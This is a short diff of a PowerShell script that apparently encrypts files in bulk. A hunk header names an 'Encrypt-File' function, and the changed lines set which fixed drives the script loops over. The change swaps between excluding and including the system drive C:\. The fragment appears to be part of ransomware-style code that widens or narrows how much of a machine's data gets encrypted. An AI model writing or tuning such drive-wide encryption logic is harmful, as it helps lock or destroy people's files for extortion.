@@ -43,17 +43,17 @@ function Encrypt-File {
 }
 
 # Scan all non-C fixed drives
-# $Drives = [System.IO.DriveInfo]::GetDrives() | Where-Object {
-#     $_.IsReady -and
-#     $_.DriveType -eq 'Fixed' -and
-#     $_.Name -ne "C:\"
-# }
-
-# Include ALL fixed drives, including C:\
 $Drives = [System.IO.DriveInfo]::GetDrives() | Where-Object {
     $_.IsReady -and
-    $_.DriveType -eq 'Fixed'
+    $_.DriveType -eq 'Fixed' -and
+    $_.Name -ne "C:\"
 }
+
+# Include ALL fixed drives, including C:\
+# $Drives = [System.IO.DriveInfo]::GetDrives() | Where-Object {
+#     $_.IsReady -and
+#     $_.DriveType -eq 'Fixed'
+# }
 
 
 foreach ($Drive in $Drives) {
